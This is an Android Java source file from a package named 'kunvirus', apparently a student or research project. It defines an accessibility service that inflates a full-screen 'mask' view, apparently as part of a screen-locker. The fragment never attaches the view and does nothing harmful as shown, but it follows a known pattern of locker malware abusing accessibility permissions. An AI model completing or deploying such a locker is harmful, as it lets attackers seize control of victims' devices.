package cn.edu.zjut.kunvirus;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;

public class LockService extends AccessibilityService {
    private View maskViewCore;

    private void beginBindService(){
        if (maskViewCore == null){
            Context applicationContext = this.getApplicationContext();
            Object winService = this.getSystemService(WINDOW_SERVICE);
            if(winService!=null){
                maskViewCore = this.createMaskView(applicationContext,(WindowManager)winService);
            }
        }
    }

    private View createMaskView(Context context, WindowManager windowManager) {
        View main_view = LayoutInflater.from(context).inflate(R.layout.activity_main, (ViewGroup)null);
        main_view.setLayoutParams(new ViewGroup.LayoutParams(-1, -1));
        return main_view;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        maskViewCore = null;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

    }

    @Override
    public void onInterrupt() {

    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo accessibilityServiceInfo = new AccessibilityServiceInfo();
        accessibilityServiceInfo.eventTypes=AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
        accessibilityServiceInfo.feedbackType=AccessibilityServiceInfo.FEEDBACK_GENERIC;
        setServiceInfo(accessibilityServiceInfo);
        beginBindService();
    }

}
